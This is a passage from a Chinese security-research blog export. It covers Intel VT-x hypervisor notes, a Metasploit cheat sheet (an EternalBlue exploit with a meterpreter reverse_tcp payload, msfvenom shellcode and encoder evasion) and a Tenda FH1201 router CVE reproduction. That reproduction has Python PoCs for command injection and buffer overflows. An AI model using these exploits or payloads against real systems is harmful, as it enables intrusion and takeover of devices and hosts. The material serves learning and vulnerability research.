status;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Clear CR4.VMXE, as there is no reason to leave the bit after vmxoff</span></span><br><span class="line">  Cr4 cr4 = &#123;__readcr4()&#125;;</span><br><span class="line">  cr4.fields.vmxe = <span class="literal">false</span>;</span><br><span class="line">  __writecr4(cr4.all);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">VmpFreeProcessorData</span>(processor_data);</span><br><span class="line">  <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>UtilVmCall调用AsmVmxCall，最后是如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">; <span class="function"><span class="type">unsigned</span> <span class="type">char</span> __stdcall <span class="title">AsmVmxCall</span><span class="params">(_In_ ULONG_PTR hypercall_number,</span></span></span><br><span class="line"><span class="params"><span class="function">;                                    _In_opt_ <span class="type">void</span> *context)</span></span>;</span><br><span class="line">AsmVmxCall PROC</span><br><span class="line">    vmcall                  ; <span class="built_in">vmcall</span>(hypercall_number, context)</span><br><span class="line">    jz errorWithCode        ; <span class="keyword">if</span> (ZF) jmp</span><br><span class="line">    jc errorWithoutCode     ; <span class="keyword">if</span> (CF) jmp</span><br><span class="line">    <span class="keyword">xor</span> rax, rax            ; <span class="keyword">return</span> VMX_OK</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<h5 id="VMM-VM"><a href="#VMM-VM" class="headerlink" title="VMM &amp;&amp; VM"></a>VMM &amp;&amp; VM</h5><p>核心功能</p>
<p>VMM是host主要负责的功能，各种行为的handler，处理vmcall</p>
<ul>
<li>ring -1 掌控着真正的硬件资源</li>
</ul>
<p>vmcall&#x2F;hypercall</p>
<ul>
<li>类似syscall，但是guest OS</li>
<li>vmcall 会 vmexit 进入host，因此我们需要相应的Exit Handler来处理</li>
</ul>
<p>VM Exit: 存在一个reason，我们需要进行分别的处理</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (exit_reason.fields.reason) &#123;</span><br><span class="line">    <span class="keyword">case</span> VmxExitReason::kExceptionOrNmi:</span><br><span class="line">      <span class="built_in">VmmpHandleException</span>(guest_context);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      ...</span><br></pre></td></tr></table></figure>

<p>VM是guest OS，类似一个操作系统的启动流程</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化VM</span></span><br><span class="line"><span class="built_in">VmpInitializeVm</span>()</span><br><span class="line">	<span class="built_in">VmpEnterVmxMode</span>()</span><br><span class="line">		__vmx_on()</span><br><span class="line">	<span class="built_in">VmpInitializeVmcs</span>()  <span class="comment">// 初始化 VMCS</span></span><br><span class="line">		__vmx_clear()</span><br><span class="line">		__vmx_vmptrld()</span><br><span class="line">	<span class="built_in">VmpSetupVmcs</span>()   <span class="comment">// VMCS 成员</span></span><br><span class="line">		_sgdt()</span><br><span class="line">		_sidt()</span><br><span class="line">		<span class="built_in">UtilVmWrite</span>()</span><br><span class="line">	<span class="built_in">VmpLaunchVm</span>()    <span class="comment">// 启动</span></span><br><span class="line">		<span class="built_in">UtilVmRead</span>()</span><br><span class="line">	__vmx_off();</span><br></pre></td></tr></table></figure>

<h3 id="EPT"><a href="#EPT" class="headerlink" title="EPT"></a>EPT</h3><p>内存虚拟化</p>
<p>Shadow paging，不需要硬件支持</p>
<ul>
<li>直接将 gva -&gt; hpa</li>
<li>运行guest时，切换 host CR3 到 shadow paging （hypervisor 拦截 guest 对 CR3的修改</li>
</ul>
<p>EPT, nested paging, 嵌套页表</p>
<ul>
<li>guest操作系统维护一张页表，用于生成guest的物理地址。CR3&#x2F;EPTP</li>
<li>另一个页表由 VMM 维护，它将 guest 的物理地址映射到 host 的物理地址。</li>
</ul>
<p>Windows 四级页表：9-9-9-9-12 <a href="https://www.cnblogs.com/lanrenxinxin/p/4735027.html">(1)</a></p>
<ul>
<li>PML4T: page map level4 table</li>
<li>PDPT: page directory pointer table</li>
<li>PD: page directory</li>
<li>PT: page table</li>
<li>entry + offset</li>
</ul>
<p><code>Physical Address Extension</code>: PAE物理地址扩展，处理器功能，使 x86 处理器能够在支持访问超过 4 GB 的物理内存。<br><code>Page Size Extension</code>: PSE，是在IA32架构中，实现大于传统的4KB的页面</p>
<h2 id="AMD-V"><a href="#AMD-V" class="headerlink" title="AMD-V"></a>AMD-V</h2><p>在<a href="https://www.amd.com/en/developer/browse-by-resource-type/documentation.html">AMD Developer Documentation</a>中搜索<code>AMD64 Architecture Programmer’s Manual Volume 2: System Programming</code>，第15章</p>
<p>因为笔者的机器是AMD CPU，因此主要学习AMD-V。下一篇文章😋</p>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>不错的项目文章：<a href="https://memn0ps.github.io/hypervisor-development-in-rust-part-1/">Hypervisor Development in Rust Part 1 - memN0ps</a></p>
<p>Cr8：Irql权限等级。CPU的当前优先级。当中断挂起时，将中断向量号的7:4位与CR8进行比较。如果向量更大，它将被服务，否则它将被挂起，直到CR8被设置为较低的值</p>
<p>Windows hype-V 可以开启嵌套虚拟化。</p>
<p>kAFL: 借助Intel PT 和 VT-x 的硬件反馈fuzzer</p>
<ul>
<li>PT: Processor tracer, 跟踪信息</li>
</ul>
<p>Ring -1: Intel VT</p>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>msf</title>
    <url>/2024/01/31/msf/</url>
    <content><![CDATA[<blockquote>
<p>Metasploit Framework 简单用用</p>
</blockquote>
<span id="more"></span>

<h2 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf6 &gt; search ms17_010                                                      <span class="comment"># 寻找相关</span></span><br><span class="line">msf6 &gt; use 1                                                                <span class="comment"># search出的结果</span></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show payloads                   <span class="comment"># 显示可以使用的payloads</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options                    <span class="comment"># exploit 参数</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> LHOST 192.168.41.148        <span class="comment"># 设置参数</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit</span><br></pre></td></tr></table></figure>

<p>meterpreter 操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; shell</span><br><span class="line">meterpreter&gt; background      <span class="comment"># 返回msf</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; session -l    <span class="comment"># 显示所有的session `session 0` 重新 attach</span></span><br></pre></td></tr></table></figure>

<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>后门生成，免杀</p>
<p>寻找payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfvenom -l payload | grep linux</span><br><span class="line">$ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options</span><br></pre></td></tr></table></figure>

<p>生成shellcode</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -p: payload</span></span><br><span class="line"><span class="comment"># -a: arch</span></span><br><span class="line"><span class="comment"># -f: format</span></span><br><span class="line">$ msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform=linux LHOST=127.0.0.1 LPORT=9001 -f c</span><br></pre></td></tr></table></figure>

<p>encoder：可以过掉部分waf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfvenom --list encoders</span><br><span class="line"><span class="comment"># -e: encoder</span></span><br><span class="line"><span class="comment"># -i: iterations，编码多次</span></span><br><span class="line">$ msfvenom -e php/base64 -i 10  </span><br></pre></td></tr></table></figure>

<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p>生成随机字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msf-pattern_create -l 100</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>init-blog</title>
    <url>/2023/03/19/init-blog/</url>
    <content><![CDATA[<blockquote>
<p>blog init</p>
</blockquote>
<span id="more"></span>

<h1 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>github + hexo</p>
<h3 id="hexo使用"><a href="#hexo使用" class="headerlink" title="hexo使用"></a>hexo使用</h3><p><code>hexo</code> 命令报错，上网查，使用 <code>npx hexo</code></p>
<p>插件下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>

<p>常用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hexo init <span class="comment"># 初始化一个仓库</span></span><br><span class="line">npx hexo clean</span><br><span class="line">npx hexo g   <span class="comment"># 静态界面生成</span></span><br><span class="line">npx hexo s   <span class="comment"># 本地启动 service</span></span><br><span class="line">npx hexo d   <span class="comment"># 插件。传到github</span></span><br><span class="line"></span><br><span class="line">npx hexo new page &lt;name&gt; <span class="comment"># 生成目录</span></span><br><span class="line">npx hexo new &lt;name&gt;.md   <span class="comment">#生成文章</span></span><br></pre></td></tr></table></figure>

<p>常用属性</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title: 标题， 使用 &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="built_in">date</span>: 日期, 使用 &#123;&#123;<span class="built_in">date</span>&#125;&#125;</span><br><span class="line">updated: 更新</span><br><span class="line">tags: 标签</span><br><span class="line">categories: 分类</span><br><span class="line">comments: 开启评论 <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><ul>
<li>obsidian 写md</li>
<li>vscode</li>
</ul>
<h2 id="持续学习"><a href="#持续学习" class="headerlink" title="持续学习"></a>持续学习</h2><ul>
<li>简单点也还行，不想折腾了。</li>
<li>官网 + google，满足一切要求</li>
</ul>
<p><a href="https://hexo.io/zh-cn/docs/">中文文档</a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>tenda-FH1201-cve</title>
    <url>/2024/08/17/tenda-FH1201-cve/</url>
    <content><![CDATA[<blockquote>
<p>一个老固件了😢</p>
</blockquote>
<span id="more"></span>

<h2 id="FH1201"><a href="#FH1201" class="headerlink" title="FH1201"></a>FH1201</h2><p><a href="https://www.tendacn.com/download/detail-3322.html">FH1201 Firmware_Tenda</a></p>
<ul>
<li><a href="https://github.com/iotresearch/iot-vuln/blob/main/Tenda/FH1201/exeCommand/README.md">cve</a></li>
</ul>
<p>固件解包需要下载 <code>sasquatch</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch --depth=1</span><br><span class="line">$ CC=gcc-9 ./build.sh</span><br></pre></td></tr></table></figure>

<p>32位 mips 小端序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file bin/busybox</span><br><span class="line">bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure>

<p>网卡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo brctl addbr br0 </span><br><span class="line">$ sudo brctl addif br0 eth0 </span><br><span class="line">$ sudo ifconfig br0 up </span><br><span class="line">$ sudo dhclient br0</span><br></pre></td></tr></table></figure>

<p>只需要模拟 httpd</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) . </span><br><span class="line">$ sudo <span class="built_in">chroot</span> ./ ./qemu-mipsel-static ./bin/httpd</span><br></pre></td></tr></table></figure>

<p>需要patch一部分</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ~/idapro-9.0/ida64 bin/httpd</span><br></pre></td></tr></table></figure>

<p>patch main函数的<code>check_network</code>函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">loc_489228:</span><br><span class="line">addiu   $v0, $fp, <span class="number">0xE0</span>+var_34</span><br><span class="line">move    $a0, $v0</span><br><span class="line">la      $t9, check_network</span><br><span class="line">nop</span><br><span class="line">li      $v0, <span class="number">1</span>           # Keypatch modified <span class="keyword">this</span> from:</span><br><span class="line">                         <span class="meta">#   jalr $t9 # check_network</span></span><br><span class="line">nop                      # Keypatch modified <span class="keyword">this</span> from:</span><br><span class="line">                         <span class="meta">#   nop</span></span><br><span class="line">lw      $gp, <span class="number">0xE0</span>+<span class="built_in">var_D0</span>($fp)</span><br><span class="line">bgtz    $v0, loc_48926C</span><br><span class="line">nop</span><br></pre></td></tr></table></figure>

<p>goahead webserver框架，查看路由</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">websFormDefine</span>(<span class="string">&quot;exeCommand&quot;</span>, formexeCommand);</span><br></pre></td></tr></table></figure>

<p>漏洞代码：可以看出来cmd没做检查，最后直接有个 <code>else</code> 也就是可以执行任意命令。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">FILE *__fastcall <span class="title">formexeCommand</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// $v0</span></span><br><span class="line">  FILE *result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">512</span>]; <span class="comment">// [sp+28h] [+28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">256</span>]; <span class="comment">// [sp+228h] [+228h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">4096</span>]; <span class="comment">// [sp+328h] [+328h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">4096</span>]; <span class="comment">// [sp+1328h] [+1328h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="built_in">sizeof</span>(v7));</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="built_in">sizeof</span>(v8));</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="built_in">sizeof</span>(v9));</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="built_in">sizeof</span>(v10));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  src = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, <span class="string">&quot;cmdinput&quot;</span>, &amp;unk_4AFDC0);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, src);</span><br><span class="line">  <span class="built_in">myCmd</span>(v8, v7);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;cd&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(path_buf);</span><br><span class="line">    <span class="built_in">myPath</span>(path_buf, v7, v1);</span><br><span class="line">    <span class="built_in">doSystemCmd</span>(<span class="string">&quot;echo %s &gt; /tmp/cmdTmp.txt&quot;</span>, path_buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;ls&quot;</span>) || !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;cat&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">myLsCat</span>(v7);</span><br><span class="line">    <span class="built_in">doSystemCmd</span>(<span class="string">&quot;%s &gt; /tmp/cmdTmp.txt&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;echo&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">myEcho</span>(v7);</span><br><span class="line">    <span class="built_in">doSystemCmd</span>(<span class="string">&quot;%s&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;pwd&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">doSystemCmd</span>(<span class="string">&quot;echo %s &gt; /tmp/cmdTmp.txt&quot;</span>, path_buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;ping&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">doSystemCmd</span>(<span class="string">&quot;%s -c 3 &gt; /tmp/cmdTmp.txt&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">doSystemCmd</span>(<span class="string">&quot;%s &gt; /tmp/cmdTmp.txt&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="built_in">fopen</span>(<span class="string">&quot;/tmp/cmdTmp.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  stream = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="built_in">sizeof</span>(v10));</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">fgets</span>(v10, <span class="number">4096</span>, stream) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      n = <span class="built_in">strlen</span>(v10);</span><br><span class="line">      <span class="keyword">if</span> ( v3 + n + <span class="number">1</span> &gt;= <span class="number">0x1001</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">memcpy</span>(&amp;v9[v3], v10, n);</span><br><span class="line">      v3 += n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(stream);</span><br><span class="line">    <span class="built_in">websWrite</span>(</span><br><span class="line">      a1,</span><br><span class="line">      <span class="string">&quot;HTTP/1.0 200 OK\nContent-type: text/plain; charset=utf-8\nPragma: no-cache\nCache-Control: no-cache\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">websWrite</span>(a1, <span class="string">&quot;%s&quot;</span>, v9);</span><br><span class="line">    <span class="keyword">return</span> (FILE *)<span class="built_in">websDone</span>(a1, <span class="number">200</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PoC</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;192.168.85.143&#x27;</span></span><br><span class="line"></span><br><span class="line">url = f<span class="string">&quot;http://&#123;ip&#125;/goform/exeCommand&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;cmdinput=ls;&quot;</span></span><br><span class="line">ret = requests.<span class="built_in">post</span>(url=url,data=data)</span><br></pre></td></tr></table></figure>

<p>可以成功命令执行</p>
<p>在复现一下其余的：<code>fromDhcpListClient</code> 函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">fromDhcpListClient</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *Var; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [sp+28h] [+28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">256</span>]; <span class="comment">// [sp+128h] [+128h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">320</span>]; <span class="comment">// [sp+228h] [+228h] BYREF</span></span><br><span class="line">  _DWORD v10[<span class="number">4</span>]; <span class="comment">// [sp+368h] [+368h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  nptr = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, <span class="string">&quot;LISTLEN&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">  Var = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, <span class="string">&quot;page&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  v9[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">atoi</span>(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v1 + <span class="number">1</span> &lt; i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="built_in">sizeof</span>(v10));</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="type">char</span> *)v10, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;list&quot;</span>, i);</span><br><span class="line">    v6 = <span class="built_in">websGetVar</span>(a1, v10, &amp;unk_4AEC38);</span><br><span class="line">    <span class="built_in">strcpy</span>(v8, (<span class="type">const</span> <span class="type">char</span> *)(v6 + <span class="number">1</span>));    <span class="comment">// buffer overflow [1]</span></span><br><span class="line">    v8[<span class="built_in">strlen</span>(v8) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(v9, <span class="string">&quot;dhcps.Staticip%d&quot;</span>, i);</span><br><span class="line">    <span class="built_in">SetValue</span>(v9, v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">SetValue</span>(<span class="string">&quot;dhcps.Staticnum&quot;</span>, nptr);</span><br><span class="line">  <span class="built_in">sprintf</span>(v7, <span class="string">&quot;lan_dhcp_static.asp?page=%s&quot;</span>, Var);  <span class="comment">// buffer overflow [2]</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">CommitCfm</span>() )</span><br><span class="line">    <span class="built_in">LoadDhcpService</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">websRedirect</span>(a1, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>针对 <code>[1]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.85.143&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/goform/DhcpListClient&quot;</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;LISTLEN&quot;</span>:<span class="number">1</span>,<span class="string">&quot;page&quot;</span>:<span class="number">1</span>,<span class="string">&quot;list1&quot;</span>: payload&#125;</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>


<p>针对 <code>[2]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">IP = <span class="string">&quot;192.168.85.143&quot;</span></span><br><span class="line">url = <span class="string">f&quot;http://<span class="subst">&#123;IP&#125;</span>/goform/fromDhcpListClient?&quot;</span></span><br><span class="line">url += <span class="string">&quot;page=&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x1000</span></span><br><span class="line">url += <span class="string">&quot;&amp;LISTLEN=0&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>漏洞利用</p>
<ul>
<li>MIPS ROP？</li>
<li>rwx shellcode</li>
</ul>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>查看tenda httpd相关漏洞，栈溢出</p>
<ul>
<li>命令注入</li>
<li>strcpy</li>
<li>sprintf</li>
<li>strcat</li>
</ul>
<p>用插件：<a href="https://github.com/Accenture/VulFi">VulFi: IDA Pro plugin</a>，寻找到一个 <code>formWrlExtraGet</code>，没有人申请？</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">formWrlExtraGet</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  chkHz = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, <span class="string">&quot;chkHz&quot;</span>, <span class="string">&quot;0&quot;</span>);    <span class="comment">// get from parameter</span></span><br><span class="line">  Var = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, <span class="string">&quot;extra_mode&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(chkHz, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">get_wl_cfg_info</span>(<span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, v62, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(chkHz, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">get_wl_cfg_info</span>(<span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, v62, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sprintf</span>(v63, <span class="string">&quot;%s%s&quot;</span>, v62, <span class="string">&quot;wisp.&quot;</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(v64, <span class="string">&quot;%s%s&quot;</span>, v62, <span class="string">&quot;client.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !Var )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">sub_4716B0</span>(v62, <span class="string">&quot;wds.bdg.limit&quot;</span>, v66);</span><br><span class="line">    <span class="built_in">GetValue</span>(v1, v33);</span><br><span class="line">    v2 = <span class="built_in">sub_4716B0</span>(v62, <span class="string">&quot;workmode&quot;</span>, v66);</span><br><span class="line">    <span class="built_in">GetValue</span>(v2, v59);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v59, <span class="string">&quot;sta&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      Var = <span class="string">&quot;wisp&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v59, <span class="string">&quot;wet&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      Var = <span class="string">&quot;apclient&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)v33, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      Var = <span class="string">&quot;wds&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Var = <span class="string">&quot;ap&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcat</span>(v60, chkHz);   <span class="comment">// <span class="doctag">BUG:</span> not check size lead to bufffer overflow</span></span><br><span class="line">  <span class="built_in">strcat</span>(v60, <span class="string">&quot;\r&quot;</span>);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>PoC 导致DoS</p>
